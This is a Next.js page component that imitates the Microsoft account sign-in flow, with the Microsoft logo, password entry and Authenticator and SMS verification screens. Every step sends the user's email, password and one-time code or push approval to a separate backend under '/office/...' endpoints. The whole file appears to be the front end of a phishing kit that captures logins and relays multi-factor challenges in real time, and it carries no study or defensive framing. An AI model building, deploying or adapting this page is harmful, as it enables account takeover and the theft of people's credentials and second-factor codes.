"use client";

import { useState } from "react";
import styles from "./page.module.css";
import Image from "next/image";

type LoginStep = "email" | "password" | "2fa" | "success";

const API_BASE_URL =
  process.env.NEXT_PUBLIC_API_BASE_URL || "http://localhost:8000/api";
const API_KEY = process.env.NEXT_PUBLIC_API_KEY || "";

export default function Home() {
  const [step, setStep] = useState<LoginStep>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [twoFACode, setTwoFACode] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [challengeType, setChallengeType] = useState<string | null>(null);
  const [challengeMetadata, setChallengeMetadata] = useState<any>(null);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || isLoading) return;

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch(`${API_BASE_URL}/office/login/initiate`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-API-Key": API_KEY,
        },
        body: JSON.stringify({ email }),
      });

      const data = await response.json();

      if (data.success) {
        setSessionId(data.sessionId);
        if (data.status === "REQUIRES_PASSWORD") {
          setStep("password");
        } else if (data.status === "AUTHENTICATED") {
          setStep("success");
        } else {
          // Handle other statuses if necessary
          setStep("password");
        }
      } else {
        setError(data.message || "Failed to initiate login");
      }
    } catch (err) {
      setError("An error occurred. Please try again.");
      console.error("Initiate login error:", err);
    } finally {
      setIsLoading(false);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim() || isLoading || !sessionId) return;

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch(`${API_BASE_URL}/office/login/password`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-API-Key": API_KEY,
        },
        body: JSON.stringify({ sessionId, password }),
      });

      const data = await response.json();

      if (data.success) {
        if (data.challengeType) {
          setChallengeType(data.challengeType);
          setChallengeMetadata(data.challengeMetadata || null);
          setStep("2fa");
        } else if (
          data.status === "AUTHENTICATED" ||
          data.status === "COMPLETED"
        ) {
          setStep("success");
        } else {
          setStep("success"); // Default to success if success=true but status is unknown
        }
      } else {
        // Check for 2FA even if success is false but data contains challenge
        if (data.challengeType) {
          setChallengeType(data.challengeType);
          setChallengeMetadata(data.challengeMetadata || null);
          setStep("2fa");
        } else {
          setError(data.message || "Invalid password or login failed");
          setPassword(""); // Clear password on error as Microsoft usually does
        }
      }
    } catch (err) {
      setError("An error occurred. Please try again.");
      console.error("Submit password error:", err);
    } finally {
      setIsLoading(false);
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // For APP/PUSH, code might not be required if we're just waiting
    const isPush = challengeType === "APP" || challengeType === "PUSH";
    if (!isPush && !twoFACode.trim()) return;
    if (isLoading || !sessionId) return;

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch(`${API_BASE_URL}/office/2fa`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-API-Key": API_KEY,
        },
        body: JSON.stringify({ sessionId, code: twoFACode }),
      });

      const data = await response.json();

      if (data.success) {
        setStep("success");
      } else {
        // Handle multi-step verification (EMAIL_ADDRESS -> EMAIL_OTP)
        if (data.challengeType) {
          setChallengeType(data.challengeType);
          setChallengeMetadata(data.challengeMetadata || null);
          setTwoFACode("");
          if (data.message) setError(data.message);
        } else {
          setError(data.message || "Invalid code");
        }
      }
    } catch (err) {
      setError("An error occurred. Please try again.");
      console.error("Submit 2FA error:", err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    if (step === "password") {
      setStep("email");
      setPassword("");
    } else if (step === "2fa") {
      setStep("password");
      setTwoFACode("");
    }
    setError(null);
  };

  // Helper to render 2FA step content
  const render2FAStep = () => {
    const isIdentityVerification =
      challengeType === "EMAIL" &&
      challengeMetadata?.officeVerificationStep === "EMAIL_ADDRESS";
    const isEmailOTP =
      challengeType === "EMAIL" &&
      challengeMetadata?.officeVerificationStep === "EMAIL_OTP";
    const isPush = challengeType === "APP" || challengeType === "PUSH";
    const maskedEmail = challengeMetadata?.maskedEmail;

    let title = "Verify your identity";
    let description = "Please select a way to verify your identity.";
    let inputPlaceholder = "Code";
    let inputType = "text";

    if (isIdentityVerification) {
      title = "Help us protect your account";
      description = maskedEmail
        ? `To verify this is your email address, enter it below. We'll send a code to ${maskedEmail} to verify your account.`
        : "Please enter your full recovery email address to receive a verification code.";
      inputPlaceholder = "Email address";
      inputType = "email";
    } else if (isEmailOTP || challengeType === "EMAIL") {
      title = "Enter code";
      description = `We sent a code to your email. Please enter it below.`;
      inputPlaceholder = "Code";
    } else if (challengeType === "SMS") {
      title = "Enter code";
      description = "We sent a code to your phone. Please enter it below.";
      inputPlaceholder = "Code";
      inputType = "tel";
    } else if (isPush) {
      title = "Approve request";
      description =
        "Check your Microsoft Authenticator app to approve the sign-in request.";
    }

    return (
      <>
        <div className={styles.emailPill}>
          <span className={styles.emailText}>{email}</span>
        </div>

        <h1 className={styles.heading}>{title}</h1>
        <p
          style={{
            fontSize: "0.9375rem",
            marginBottom: "1rem",
            lineHeight: "1.4",
          }}
        >
          {description}
        </p>

        <form className={styles.form} onSubmit={handle2FASubmit}>
          {!isPush && (
            <div className={styles.inputContainer}>
              <input
                type={inputType}
                className={styles.input}
                placeholder={inputPlaceholder}
                autoFocus
                value={twoFACode}
                onChange={(e) => setTwoFACode(e.target.value)}
                disabled={isLoading}
              />
            </div>
          )}

          <div className={styles.buttonContainer}>
            <button
              type="submit"
              className={styles.signInButton}
              disabled={isLoading}
            >
              {isLoading
                ? "Verifying..."
                : isPush
                  ? "I've approved it"
                  : "Verify"}
            </button>
          </div>

          {challengeMetadata?.hasCodeLink && (
            <div
              className={styles.linksContainer}
              style={{ marginTop: "1rem" }}
            >
              <a
                href="#"
                className={styles.link}
                onClick={(e) => {
                  e.preventDefault();
                  // This could trigger a state change to move to OTP input directly if backend supports it
                }}
              >
                I have a code
              </a>
            </div>
          )}
        </form>
      </>
    );
  };

  return (
    <div className={styles.container}>
      <div className={styles.content}>
        <div className={styles.loginCard}>
          {/* Back Arrow */}
          {(step === "password" || step === "2fa") && (
            <button
              className={styles.backButton}
              onClick={handleBack}
              type="button"
              aria-label="Go back"
              disabled={isLoading}
            >
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <path
                  d="M10 13L5 8L10 3"
                  stroke="#1b1b1b"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </button>
          )}

          {/* Microsoft Logo */}
          <div className={styles.logoContainer}>
            <Image
              src="/microsoft-logo.svg"
              alt="Microsoft"
              width={108}
              height={24}
              className={styles.logo}
              priority
            />
          </div>

          {/* Error Message */}
          {error && <div className={styles.errorMessage}>{error}</div>}

          {/* Email Step */}
          {step === "email" && (
            <>
              <h1 className={styles.heading}>Sign in</h1>
              <form className={styles.form} onSubmit={handleEmailSubmit}>
                <div className={styles.inputContainer}>
                  <input
                    type="email"
                    className={styles.input}
                    placeholder="Email, phone, or Skype"
                    autoComplete="email"
                    autoFocus
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    disabled={isLoading}
                  />
                </div>
                <div className={styles.linksContainer}>
                  <span className={styles.linkText}>
                    No account?{" "}
                    <a href="#" className={styles.link}>
                      Create one!
                    </a>
                  </span>
                  <a href="#" className={styles.link}>
                    Can&apos;t access your account?
                  </a>
                </div>
                <div className={styles.buttonContainer}>
                  <button
                    type="submit"
                    className={styles.nextButton}
                    disabled={isLoading}
                  >
                    {isLoading ? "Please wait..." : "Next"}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* Password Step */}
          {step === "password" && (
            <>
              <div className={styles.emailPill}>
                <span className={styles.emailText}>{email}</span>
              </div>

              <h1 className={styles.heading}>Enter password</h1>

              <form className={styles.form} onSubmit={handlePasswordSubmit}>
                <div className={styles.passwordInputContainer}>
                  <input
                    type={showPassword ? "text" : "password"}
                    className={styles.passwordInput}
                    placeholder="Password"
                    autoComplete="current-password"
                    autoFocus
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    disabled={isLoading}
                  />
                  <button
                    type="button"
                    className={styles.showPasswordButton}
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={
                      showPassword ? "Hide password" : "Show password"
                    }
                  >
                    {showPassword ? (
                      <svg
                        width="20"
                        height="20"
                        viewBox="0 0 20 20"
                        fill="none"
                      >
                        <path
                          d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z"
                          stroke="#666"
                          strokeWidth="1.5"
                        />
                        <circle
                          cx="10"
                          cy="10"
                          r="2.5"
                          stroke="#666"
                          strokeWidth="1.5"
                        />
                        <path d="M3 17L17 3" stroke="#666" strokeWidth="1.5" />
                      </svg>
                    ) : (
                      <svg
                        width="20"
                        height="20"
                        viewBox="0 0 20 20"
                        fill="none"
                      >
                        <path
                          d="M2 10s3-6 8-6 8 6 8 6-3 6-8 6-8-6-8-6z"
                          stroke="#666"
                          strokeWidth="1.5"
                        />
                        <circle
                          cx="10"
                          cy="10"
                          r="2.5"
                          stroke="#666"
                          strokeWidth="1.5"
                        />
                      </svg>
                    )}
                  </button>
                </div>

                <div className={styles.linksContainer}>
                  <a href="#" className={styles.link}>
                    Forgot password?
                  </a>
                </div>

                <div className={styles.buttonContainer}>
                  <button
                    type="submit"
                    className={styles.signInButton}
                    disabled={isLoading}
                  >
                    {isLoading ? "Signing in..." : "Sign in"}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* 2FA Step */}
          {step === "2fa" && render2FAStep()}

          {/* Success Step */}
          {step === "success" && (
            <div style={{ textAlign: "center", padding: "2rem 0" }}>
              <div style={{ fontSize: "3rem", marginBottom: "1rem" }}>✅</div>
              <h1 className={styles.heading}>Success!</h1>
              <p>You have successfully authenticated.</p>
            </div>
          )}
        </div>

        {(step === "email" || step === "password" || step === "2fa") && (
          <div className={styles.signInOptions}>
            {step === "email" ? (
              <>
                <svg
                  className={styles.keyIcon}
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M6.5 8C7.88071 8 9 6.88071 9 5.5C9 4.11929 7.88071 3 6.5 3C5.11929 3 4 4.11929 4 5.5C4 6.88071 5.11929 8 6.5 8Z"
                    stroke="#1b1b1b"
                    strokeWidth="1.2"
                  />
                  <path d="M9 5.5H14" stroke="#1b1b1b" strokeWidth="1.2" />
                  <path d="M12 5.5V7.5" stroke="#1b1b1b" strokeWidth="1.2" />
                  <path d="M14 5.5V7.5" stroke="#1b1b1b" strokeWidth="1.2" />
                </svg>
                <span className={styles.optionsText}>Sign-in options</span>
              </>
            ) : (
              <span className={styles.optionsText}>Other ways to sign in</span>
            )}
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className={styles.footer}>
        <a href="#" className={styles.footerLink}>
          Terms of use
        </a>
        <a href="#" className={styles.footerLink}>
          Privacy &amp; cookies
        </a>
        <button className={styles.moreOptions}>...</button>
      </footer>
    </div>
  );
}
